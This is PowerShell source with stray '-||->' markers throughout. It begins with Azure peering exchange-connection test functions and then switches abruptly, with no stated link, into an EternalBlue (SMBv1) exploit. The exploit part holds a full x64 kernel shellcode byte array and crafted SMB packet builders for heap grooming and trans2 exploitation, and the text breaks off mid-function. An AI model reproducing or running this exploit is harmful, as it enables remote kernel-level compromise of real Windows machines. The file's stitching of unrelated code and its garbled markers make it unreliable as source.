













 -||-> function Test-NewExchangeConnectionV4V6
{
	
	 -||-> $kind =  -||-> isDirect $false <-||-  <-||- ;
	 -||-> $loc = "Los Angeles" <-||- 
	 -||-> $peeringLocation =  -||-> getPeeringLocation $kind $loc <-||-  <-||- ;
	 -||-> $facilityId = $peeringLocation[0].PeeringDBFacilityId <-||- 
	
	 -||-> Write-Debug "Creating Connection at $facilityId" <-||- 
	 -||-> $md5 =  -||-> getHash <-||-  <-||- 
	 -||-> $md5 = $md5.ToString() <-||- 
	 -||-> Write-Debug "Created Hash $md5" <-||- 
	 -||-> $sessionv4 =  -||-> newIpV4Address $false $false 0 0 <-||-  <-||- 
	 -||-> $sessionv6 =  -||-> newIpV6Address $false $false 0 0 <-||-  <-||- 
	 -||-> Write-Debug "Created IPs $sessionv4" <-||- 
	 -||-> $maxv4 =  -||-> maxAdvertisedIpv4 <-||-  <-||- 
	 -||-> $maxv6 =  -||-> maxAdvertisedIpv6 <-||-  <-||- 
	 -||-> Write-Debug "Created maxAdvertised $maxv4 $maxv6" <-||- 
	
     -||-> $createdConnection =  -||-> New-AzPeeringExchangeConnectionObject -PeeringDbFacilityId $facilityId -MaxPrefixesAdvertisedIPv4 $maxv4 -MaxPrefixesAdvertisedIPv6 $maxv6 -PeerSessionIPv4Address $sessionv4 -PeerSessionIPv6Address $sessionv6 -MD5AuthenticationKey $md5 <-||-  <-||- 
	 -||-> Assert-AreEqual $md5 $createdConnection.BgpSession.Md5AuthenticationKey <-||- 
	 -||-> Assert-AreEqual $facilityId $createdConnection.PeeringDBFacilityId <-||-  
     -||-> Assert-AreEqual $maxv4 $createdConnection.BgpSession.MaxPrefixesAdvertisedV4 <-||- 
     -||-> Assert-AreEqual $maxv6 $createdConnection.BgpSession.MaxPrefixesAdvertisedv6 <-||- 
	 -||-> Assert-AreEqual $sessionv4 $createdConnection.BgpSession.PeerSessionIPv4Address <-||- 
     -||-> Assert-AreEqual $sessionv6 $createdConnection.BgpSession.PeerSessionIPv6Address <-||- 
} <-||- 

 -||-> function Test-NewExchangeConnectionV4
{
	
	 -||-> $kind =  -||-> isDirect $false <-||-  <-||- ;
	 -||-> $loc = "Los Angeles" <-||- 
	 -||-> $peeringLocation =  -||-> getPeeringLocation $kind $loc <-||-  <-||- ;
	 -||-> $facilityId = $peeringLocation[0].PeeringDBFacilityId <-||- 
	
	 -||-> Write-Debug "Creating Connection at $facilityId" <-||- 
	 -||-> $md5 =  -||-> getHash <-||-  <-||- 
	 -||-> $md5 = $md5.ToString() <-||- 
	 -||-> Write-Debug "Created Hash $md5" <-||- 
	 -||-> $sessionv4 =  -||-> newIpV4Address $false $false 0 0 <-||-  <-||- 
	 -||-> $sessionv6 = $null <-||- 
	 -||-> Write-Debug "Created IPs $sessionv4" <-||- 
	 -||-> $maxv4 =  -||-> maxAdvertisedIpv4 <-||-  <-||- 
	 -||-> $maxv6 = $null <-||- 
	 -||-> Write-Debug "Created maxAdvertised $maxv4 $maxv6" <-||- 
	
     -||-> $createdConnection =  -||-> New-AzPeeringExchangeConnectionObject -PeeringDbFacilityId $facilityId -MaxPrefixesAdvertisedIPv4 $maxv4 -PeerSessionIPv4Address $sessionv4 -MD5AuthenticationKey $md5 <-||-  <-||- 
	 -||-> Assert-AreEqual $md5 $createdConnection.BgpSession.Md5AuthenticationKey <-||- 
	 -||-> Assert-AreEqual $facilityId $createdConnection.PeeringDBFacilityId <-||-  
     -||-> Assert-AreEqual $maxv4 $createdConnection.BgpSession.MaxPrefixesAdvertisedV4 <-||- 
     -||-> Assert-AreEqual $maxv6 $createdConnection.BgpSession.MaxPrefixesAdvertisedv6 <-||- 
	 -||-> Assert-AreEqual $sessionv4 $createdConnection.BgpSession.PeerSessionIPv4Address <-||- 
     -||-> Assert-AreEqual $sessionv6 $createdConnection.BgpSession.PeerSessionIPv6Address <-||- 
} <-||- 

 -||-> function Test-NewExchangeConnectionV6
{
	
	 -||-> $kind =  -||-> isDirect $false <-||-  <-||- ;
	 -||-> $loc = "Los Angeles" <-||- 
	 -||-> $peeringLocation =  -||-> getPeeringLocation $kind $loc <-||-  <-||- ;
	 -||-> $facilityId = $peeringLocation[0].PeeringDBFacilityId <-||- 
	
	 -||-> Write-Debug "Creating Connection at $facilityId" <-||- 
	 -||-> $md5 =  -||-> getHash <-||-  <-||- 
	 -||-> $md5 = $md5.ToString() <-||- 
	 -||-> Write-Debug "Created Hash $md5" <-||- 
	 -||-> $sessionv6 =  -||-> newIpV6Address $false $false 0 0 <-||-  <-||- 
	 -||-> Write-Debug "Created IPs $sessionv4" <-||- 
	 -||-> $maxv6 =  -||-> maxAdvertisedIpv6 <-||-  <-||- 
	 -||-> Write-Debug "Created maxAdvertised $maxv4 $maxv6" <-||- 
	
     -||-> $createdConnection =  -||-> New-AzPeeringExchangeConnectionObject -PeeringDbFacilityId $facilityId -MaxPrefixesAdvertisedIPv6 $maxv6 -PeerSessionIPv6Address $sessionv6 -MD5AuthenticationKey $md5 <-||-  <-||- 
	 -||-> Assert-AreEqual $md5 $createdConnection.BgpSession.Md5AuthenticationKey <-||- 
	 -||-> Assert-AreEqual $facilityId $createdConnection.PeeringDBFacilityId <-||-  
     -||-> Assert-AreEqual $null $createdConnection.BgpSession.MaxPrefixesAdvertisedV4 <-||- 
     -||-> Assert-AreEqual $maxv6 $createdConnection.BgpSession.MaxPrefixesAdvertisedv6 <-||- 
	 -||-> Assert-AreEqual $null $createdConnection.BgpSession.PeerSessionIPv4Address <-||- 
     -||-> Assert-AreEqual $sessionv6 $createdConnection.BgpSession.PeerSessionIPv6Address <-||- 
} <-||- 

 -||-> function Test-NewExchangeConnectionWrongV4
{
	
	 -||-> $kind =  -||-> isDirect $false <-||-  <-||- ;
	 -||-> $loc = "Los Angeles" <-||- 
	 -||-> $peeringLocation =  -||-> getPeeringLocation $kind $loc <-||-  <-||- ;
	 -||-> $facilityId = $peeringLocation[0].PeeringDBFacilityId <-||- 
	
	 -||-> Write-Debug "Creating Connection at $facilityId" <-||- 
	 -||-> $md5 =  -||-> getHash <-||-  <-||- 
	 -||-> $md5 = $md5.ToString() <-||- 
	 -||-> Write-Debug "Created Hash $md5" <-||- 
	 -||-> $sessionv4 =  -||-> newIpV4Address $false $false 0 0 <-||-  <-||- 
	 -||-> $sessionv6 =  -||-> newIpV6Address $false $false 0 0 <-||-  <-||- 
	 -||-> Write-Debug "Created IPs $sessionv4" <-||- 
	 -||-> $maxv4 =  -||-> maxAdvertisedIpv4 <-||-  <-||- 
	 -||-> $maxv6 =  -||-> maxAdvertisedIpv6 <-||-  <-||- 
	 -||-> Write-Debug "Created maxAdvertised $maxv4 $maxv6" <-||- 
	
	 -||-> Assert-ThrowsContains { -||-> New-AzPeeringExchangeConnectionObject -PeeringDbFacilityId $facilityId -MaxPrefixesAdvertisedIPv4 $maxv4 -MaxPrefixesAdvertisedIPv6 $maxv6 -PeerSessionIPv4Address $sessionv4 -PeerSessionIPv6Address $sessionv6 -MD5AuthenticationKey $md5 <-||- } "Parameter name: Invalid Prefix" <-||- 
} <-||- 

 -||-> function Invoke-EternalBlue($Target, $InitialGrooms, $MaxAttempts, $Shellcode){




 -||-> $enc = [system.Text.Encoding]::ASCII <-||- 


 -||-> $GROOM_DELTA = 5 <-||- 


 -||-> function make_kernel_shellcode {
     -||-> [Byte[]] $shellcode =@( -||-> 0xB9,0x82,0x00,0x00,0xC0,0x0F,0x32,0x48,0xBB,0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,
0xFF,0x89,0x53,0x04,0x89,0x03,0x48,0x8D,0x05,0x0A,0x00,0x00,0x00,0x48,0x89,0xC2,
0x48,0xC1,0xEA,0x20,0x0F,0x30,0xC3,0x0F,0x01,0xF8,0x65,0x48,0x89,0x24,0x25,0x10,
0x00,0x00,0x00,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x50,0x53,0x51,0x52,
0x56,0x57,0x55,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x41,
0x56,0x41,0x57,0x6A,0x2B,0x65,0xFF,0x34,0x25,0x10,0x00,0x00,0x00,0x41,0x53,0x6A,
0x33,0x51,0x4C,0x89,0xD1,0x48,0x83,0xEC,0x08,0x55,0x48,0x81,0xEC,0x58,0x01,0x00,
0x00,0x48,0x8D,0xAC,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x9D,0xC0,0x00,0x00,0x00,
0x48,0x89,0xBD,0xC8,0x00,0x00,0x00,0x48,0x89,0xB5,0xD0,0x00,0x00,0x00,0x48,0xA1,
0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,0xFF,0x48,0x89,0xC2,0x48,0xC1,0xEA,0x20,0x48,
0x31,0xDB,0xFF,0xCB,0x48,0x21,0xD8,0xB9,0x82,0x00,0x00,0xC0,0x0F,0x30,0xFB,0xE8,
0x38,0x00,0x00,0x00,0xFA,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x48,0x83,
0xEC,0x78,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x41,0x5B,0x41,0x5A,0x41,0x59,
0x41,0x58,0x5D,0x5F,0x5E,0x5A,0x59,0x5B,0x58,0x65,0x48,0x8B,0x24,0x25,0x10,0x00,
0x00,0x00,0x0F,0x01,0xF8,0xFF,0x24,0x25,0xF8,0x0F,0xD0,0xFF,0x56,0x41,0x57,0x41,
0x56,0x41,0x55,0x41,0x54,0x53,0x55,0x48,0x89,0xE5,0x66,0x83,0xE4,0xF0,0x48,0x83,
0xEC,0x20,0x4C,0x8D,0x35,0xE3,0xFF,0xFF,0xFF,0x65,0x4C,0x8B,0x3C,0x25,0x38,0x00,
0x00,0x00,0x4D,0x8B,0x7F,0x04,0x49,0xC1,0xEF,0x0C,0x49,0xC1,0xE7,0x0C,0x49,0x81,
0xEF,0x00,0x10,0x00,0x00,0x49,0x8B,0x37,0x66,0x81,0xFE,0x4D,0x5A,0x75,0xEF,0x41,
0xBB,0x5C,0x72,0x11,0x62,0xE8,0x18,0x02,0x00,0x00,0x48,0x89,0xC6,0x48,0x81,0xC6,
0x08,0x03,0x00,0x00,0x41,0xBB,0x7A,0xBA,0xA3,0x30,0xE8,0x03,0x02,0x00,0x00,0x48,
0x89,0xF1,0x48,0x39,0xF0,0x77,0x11,0x48,0x8D,0x90,0x00,0x05,0x00,0x00,0x48,0x39,
0xF2,0x72,0x05,0x48,0x29,0xC6,0xEB,0x08,0x48,0x8B,0x36,0x48,0x39,0xCE,0x75,0xE2,
0x49,0x89,0xF4,0x31,0xDB,0x89,0xD9,0x83,0xC1,0x04,0x81,0xF9,0x00,0x00,0x01,0x00,
0x0F,0x8D,0x66,0x01,0x00,0x00,0x4C,0x89,0xF2,0x89,0xCB,0x41,0xBB,0x66,0x55,0xA2,
0x4B,0xE8,0xBC,0x01,0x00,0x00,0x85,0xC0,0x75,0xDB,0x49,0x8B,0x0E,0x41,0xBB,0xA3,
0x6F,0x72,0x2D,0xE8,0xAA,0x01,0x00,0x00,0x48,0x89,0xC6,0xE8,0x50,0x01,0x00,0x00,
0x41,0x81,0xF9,0xBF,0x77,0x1F,0xDD,0x75,0xBC,0x49,0x8B,0x1E,0x4D,0x8D,0x6E,0x10,
0x4C,0x89,0xEA,0x48,0x89,0xD9,0x41,0xBB,0xE5,0x24,0x11,0xDC,0xE8,0x81,0x01,0x00,
0x00,0x6A,0x40,0x68,0x00,0x10,0x00,0x00,0x4D,0x8D,0x4E,0x08,0x49,0xC7,0x01,0x00,
0x10,0x00,0x00,0x4D,0x31,0xC0,0x4C,0x89,0xF2,0x31,0xC9,0x48,0x89,0x0A,0x48,0xF7,
0xD1,0x41,0xBB,0x4B,0xCA,0x0A,0xEE,0x48,0x83,0xEC,0x20,0xE8,0x52,0x01,0x00,0x00,
0x85,0xC0,0x0F,0x85,0xC8,0x00,0x00,0x00,0x49,0x8B,0x3E,0x48,0x8D,0x35,0xE9,0x00,
0x00,0x00,0x31,0xC9,0x66,0x03,0x0D,0xD7,0x01,0x00,0x00,0x66,0x81,0xC1,0xF9,0x00,
0xF3,0xA4,0x48,0x89,0xDE,0x48,0x81,0xC6,0x08,0x03,0x00,0x00,0x48,0x89,0xF1,0x48,
0x8B,0x11,0x4C,0x29,0xE2,0x51,0x52,0x48,0x89,0xD1,0x48,0x83,0xEC,0x20,0x41,0xBB,
0x26,0x40,0x36,0x9D,0xE8,0x09,0x01,0x00,0x00,0x48,0x83,0xC4,0x20,0x5A,0x59,0x48,
0x85,0xC0,0x74,0x18,0x48,0x8B,0x80,0xC8,0x02,0x00,0x00,0x48,0x85,0xC0,0x74,0x0C,
0x48,0x83,0xC2,0x4C,0x8B,0x02,0x0F,0xBA,0xE0,0x05,0x72,0x05,0x48,0x8B,0x09,0xEB,
0xBE,0x48,0x83,0xEA,0x4C,0x49,0x89,0xD4,0x31,0xD2,0x80,0xC2,0x90,0x31,0xC9,0x41,
0xBB,0x26,0xAC,0x50,0x91,0xE8,0xC8,0x00,0x00,0x00,0x48,0x89,0xC1,0x4C,0x8D,0x89,
0x80,0x00,0x00,0x00,0x41,0xC6,0x01,0xC3,0x4C,0x89,0xE2,0x49,0x89,0xC4,0x4D,0x31,
0xC0,0x41,0x50,0x6A,0x01,0x49,0x8B,0x06,0x50,0x41,0x50,0x48,0x83,0xEC,0x20,0x41,
0xBB,0xAC,0xCE,0x55,0x4B,0xE8,0x98,0x00,0x00,0x00,0x31,0xD2,0x52,0x52,0x41,0x58,
0x41,0x59,0x4C,0x89,0xE1,0x41,0xBB,0x18,0x38,0x09,0x9E,0xE8,0x82,0x00,0x00,0x00,
0x4C,0x89,0xE9,0x41,0xBB,0x22,0xB7,0xB3,0x7D,0xE8,0x74,0x00,0x00,0x00,0x48,0x89,
0xD9,0x41,0xBB,0x0D,0xE2,0x4D,0x85,0xE8,0x66,0x00,0x00,0x00,0x48,0x89,0xEC,0x5D,
0x5B,0x41,0x5C,0x41,0x5D,0x41,0x5E,0x41,0x5F,0x5E,0xC3,0xE9,0xB5,0x00,0x00,0x00,
0x4D,0x31,0xC9,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x3C,0x61,0x7C,0x02,0x2C,0x20,
0x41,0x01,0xC1,0x38,0xE0,0x75,0xEC,0xC3,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,
0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x12,0x48,0x8B,0x72,0x50,0x48,0x0F,
0xB7,0x4A,0x4A,0x45,0x31,0xC9,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,
0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xEE,0x45,0x39,0xD9,0x75,0xDA,0x4C,0x8B,0x7A,
0x20,0xC3,0x4C,0x89,0xF8,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x89,0xC2,0x8B,
0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x01,0xD0,0x50,0x8B,
0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,
0x48,0x01,0xD6,0xE8,0x78,0xFF,0xFF,0xFF,0x45,0x39,0xD9,0x75,0xEC,0x58,0x44,0x8B,
0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,
0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,
0x5B,0x41,0x53,0xFF,0xE0,0x56,0x41,0x57,0x55,0x48,0x89,0xE5,0x48,0x83,0xEC,0x20,
0x41,0xBB,0xDA,0x16,0xAF,0x92,0xE8,0x4D,0xFF,0xFF,0xFF,0x31,0xC9,0x51,0x51,0x51,
0x51,0x41,0x59,0x4C,0x8D,0x05,0x1A,0x00,0x00,0x00,0x5A,0x48,0x83,0xEC,0x20,0x41,
0xBB,0x46,0x45,0x1B,0x22,0xE8,0x68,0xFF,0xFF,0xFF,0x48,0x89,0xEC,0x5D,0x41,0x5F,
0x5E,0xC3 <-||- ) <-||- 
return  -||-> $shellcode <-||- 
} <-||- 

 -||-> function make_kernel_user_payload($ring3) {
     -||-> $sc =  -||-> make_kernel_shellcode <-||-  <-||- 
     -||-> $sc += [bitconverter]::GetBytes([uint16] ( -||-> $ring3.length <-||- )) <-||- 
     -||-> $sc += $ring3 <-||- 
    return  -||-> $sc <-||- 
 } <-||- 
 -||-> function make_smb2_payload_headers_packet(){
     -||-> [Byte[]] $pkt = [Byte[]]( -||-> 0x00,0x00,0xff,0xf7,0xFE <-||- ) + [system.Text.Encoding]::ASCII.GetBytes("SMB") + [Byte[]]( -||-> 0x00 <-||- )*124 <-||- 

    return  -||-> $pkt <-||- 
} <-||- 

 -||-> function make_smb2_payload_body_packet($kernel_user_payload) {
     -||-> $pkt_max_len = 4204 <-||- 
     -||-> $pkt_setup_len = 497 <-||- 
     -||-> $pkt_max_payload = $pkt_max_len - $pkt_setup_len <-||- 

    
     -||-> [Byte[]] $pkt = [Byte[]] ( -||-> 0x00 <-||- ) * 0x8 <-||- 
     -||-> $pkt += 0x03,0x00,0x00,0x00 <-||- 
     -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x1c <-||- 
     -||-> $pkt += 0x03,0x00,0x00,0x00 <-||- 
      -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x74 <-||- 


     -||-> $pkt += [Byte[]] ( -||-> 0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff <-||- ) * 2 <-||-  
     -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x10 <-||- 
     -||-> $pkt += [Byte[]] ( -||-> 0xc0,0xf0,0xdf,0xff <-||- ) * 2 <-||-                  
     -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0xc4 <-||- 

    
     -||-> $pkt += 0x90,0xf1,0xdf,0xff <-||- 
     -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x4 <-||- 
     -||-> $pkt += 0xf0,0xf1,0xdf,0xff <-||- 
     -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x40 <-||- 

     -||-> $pkt += 0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff <-||- 
     -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x8 <-||- 
     -||-> $pkt += 0x00,0x02,0xd0,0xff,0xff,0xff,0xff,0xff <-||- 
     -||-> $pkt += 0x00 <-||- 

     -||-> $pkt += $kernel_user_payload <-||- 

    
     -||-> $pkt += 0x00 * ( -||-> $pkt_max_payload - $kernel_user_payload.length <-||- ) <-||- 

    return   -||-> $pkt <-||- 
} <-||- 

 -||-> function make_smb1_echo_packet($tree_id, $user_id) {
     -||-> [Byte[]]  $pkt = [Byte[]] ( -||-> 0x00 <-||- ) <-||-                
     -||-> $pkt += 0x00,0x00,0x31 <-||-        
     -||-> $pkt += [Byte[]] ( -||-> 0xff <-||- ) + $enc.GetBytes("SMB") <-||-             
     -||-> $pkt += 0x2b <-||-                
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-    
     -||-> $pkt += 0x18 <-||-                
     -||-> $pkt += 0x07,0xc0 <-||-            
     -||-> $pkt += 0x00,0x00 <-||-            
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-    
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-    
     -||-> $pkt += 0x00,0x00 <-||-            
     -||-> $pkt += $tree_id <-||-  
     -||-> $pkt += 0xff,0xfe <-||-            
     -||-> $pkt += $user_id <-||-  
     -||-> $pkt += 0x40,0x00 <-||-            

     -||-> $pkt += 0x01 <-||-                
     -||-> $pkt += 0x01,0x00 <-||-            
     -||-> $pkt += 0x0c,0x00 <-||-            

    
    
    
     -||-> $pkt +=  0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x00 <-||- 
    return  -||-> $pkt <-||- 
} <-||- 

 -||-> function make_smb1_trans2_exploit_packet($tree_id, $user_id, $type, $timeout) {
     -||-> $timeout = ( -||-> $timeout * 0x10 <-||- ) + 3 <-||- 

     -||-> [Byte[]]  $pkt = [Byte[]] ( -||-> 0x00 <-||- ) <-||-                    
     -||-> $pkt += 0x00,0x10,0x35 <-||-            
     -||-> $pkt += 0xff,0x53,0x4D,0x42 <-||-                 
     -||-> $pkt += 0x33 <-||-                    
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x18 <-||-                    
     -||-> $pkt += 0x07,0xc0 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += $user_id <-||-        
     -||-> $pkt += 0xff,0xfe <-||-                
     -||-> $pkt += $user_id <-||-      
     -||-> $pkt += 0x40,0x00 <-||-                

     -||-> $pkt += 0x09 <-||-                    
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x10 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00 <-||-                    
     -||-> $pkt += 0x00 <-||-                    
     -||-> $pkt += 0x00,0x10 <-||-                
     -||-> $pkt += 0x35,0x00,0xd0 <-||-            
     -||-> $pkt += [bitconverter]::GetBytes($timeout)[0] <-||-  
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x10 <-||-                

    
    
    
    
    

     -||-> if ( -||-> $type -eq "eb_trans2_exploit" <-||- ) {

       -||-> $pkt += [Byte[]] ( -||-> 0x41 <-||- ) * 2957 <-||- 

       -||-> $pkt += 0x80,0x00,0xa8,0x00 <-||-                      

       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x10 <-||- 
       -||-> $pkt += 0xff,0xff <-||- 
       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x6 <-||- 
       -||-> $pkt += 0xff,0xff <-||- 
       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x16 <-||- 

       -||-> $pkt += 0x00,0xf1,0xdf,0xff <-||-              
       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x8 <-||- 
       -||-> $pkt += 0x20,0xf0,0xdf,0xff <-||- 

       -||-> $pkt += 0x00,0xf1,0xdf,0xff,0xff,0xff,0xff,0xff <-||-  

       -||-> $pkt += 0x60,0x00,0x04,0x10 <-||- 
       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 4 <-||- 

       -||-> $pkt += 0x80,0xef,0xdf,0xff <-||- 

       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 4 <-||- 
       -||-> $pkt += 0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff <-||- 
       -||-> $pkt += 0x18,0x01,0xd0,0xff,0xff,0xff,0xff,0xff <-||- 
       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x10 <-||- 

       -||-> $pkt += 0x60,0x00,0x04,0x10 <-||- 
       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0xc <-||- 
       -||-> $pkt += 0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff <-||- 
       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x8 <-||- 
       -||-> $pkt += 0x80,0x10 <-||- 
       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0xe <-||- 
       -||-> $pkt += 0x39 <-||- 
       -||-> $pkt += 0xbb <-||- 

       -||-> $pkt += [Byte[]] ( -||-> 0x41 <-||- ) * 965 <-||- 

      return  -||-> $pkt <-||- 
    } <-||- 

     -||-> if( -||-> $type -eq "eb_trans2_zero" <-||- ) {
       -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 2055 <-||- 
       -||-> $pkt += 0x83,0xf3 <-||- 
       -||-> $pkt += [Byte[]] ( -||-> 0x41 <-||- ) * 2039 <-||- 
      
     }
    else {
       -||-> $pkt += [Byte[]] ( -||-> 0x41 <-||- ) * 4096 <-||- 
    } <-||- 

    return  -||-> $pkt <-||- 
  } <-||- 
 -||-> function negotiate_proto_request()
{

       -||-> [Byte[]]  $pkt = [Byte[]] ( -||-> 0x00 <-||- ) <-||-              
       -||-> $pkt += 0x00,0x00,0x54 <-||-        

       -||-> $pkt += 0xFF,0x53,0x4D,0x42 <-||-  
       -||-> $pkt += 0x72 <-||-              
       -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-  
       -||-> $pkt += 0x18 <-||-              
       -||-> $pkt +=  0x01,0x28 <-||-          
       -||-> $pkt += 0x00,0x00 <-||-          
       -||-> $pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 <-||-  
       -||-> $pkt += 0x00,0x00 <-||-          
       -||-> $pkt += 0x00,0x00 <-||-          
       -||-> $pkt += 0x2F,0x4B <-||-          
       -||-> $pkt += 0x00,0x00 <-||-          
       -||-> $pkt += 0xC5,0x5E <-||-            

       -||-> $pkt += 0x00 <-||-              
       -||-> $pkt += 0x31,0x00 <-||-          

      
       -||-> $pkt += 0x02 <-||-              
       -||-> $pkt += 0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x31,0x2E,0x30,0x00 <-||-   

       -||-> $pkt += 0x02 <-||-              
       -||-> $pkt += 0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,0x00 <-||-   

       -||-> $pkt += 0x02 <-||-              
       -||-> $pkt += 0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,0x30,0x00 <-||-  

       -||-> $pkt += 0x02 <-||-              
       -||-> $pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00 <-||-    

      return  -||-> $pkt <-||- 
} <-||- 


 -||-> function make_smb1_nt_trans_packet($tree_id, $user_id) {

     -||-> [Byte[]]  $pkt = [Byte[]] ( -||-> 0x00 <-||- ) <-||-                    
     -||-> $pkt += 0x00,0x04,0x38 <-||-            
     -||-> $pkt += 0xff,0x53,0x4D,0x42 <-||-        
     -||-> $pkt += 0xa0 <-||-                    
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x18 <-||-                    
     -||-> $pkt += 0x07,0xc0 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += $tree_id <-||-        
     -||-> $pkt += 0xff,0xfe <-||-                
     -||-> $pkt += $user_id <-||-        
     -||-> $pkt += 0x40,0x00 <-||-                

     -||-> $pkt += 0x14 <-||-                    
     -||-> $pkt += 0x01 <-||-                    
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x1e,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0xd0,0x03,0x01,0x00 <-||-        
     -||-> $pkt += 0x1e,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x1e,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x4b,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0xd0,0x03,0x00,0x00 <-||-        
     -||-> $pkt += 0x68,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x01 <-||-                    
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0xec,0x03 <-||-                
     -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 0x1f <-||-             

    
     -||-> $pkt += 0x01 <-||- 
     -||-> $pkt += [Byte[]]( -||-> 0x00 <-||- ) * 0x3cd <-||- 
    return  -||-> $pkt <-||- 
  } <-||- 

   -||-> function  make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) {

     -||-> [Byte[]] $pkt = 0x00 <-||-                    
     -||-> $pkt += 0x00,0x00,0x51 <-||-            
     -||-> $pkt += 0xff,0x53,0x4D,0x42 <-||-        
     -||-> $pkt += 0x73 <-||-                    
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x18 <-||-                    
     -||-> $pkt += $flags2 <-||-                    
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0xff,0xfe <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x40,0x00 <-||-                
    

     -||-> $pkt += 0x0c <-||-                    
     -||-> $pkt += 0xff <-||-                    
     -||-> $pkt += 0x00 <-||-                    
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x04,0x11 <-||-                
     -||-> $pkt += 0x0a,0x00 <-||-                
     -||-> $pkt += $vcnum <-||-                     
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00,0x00,0x80 <-||-        
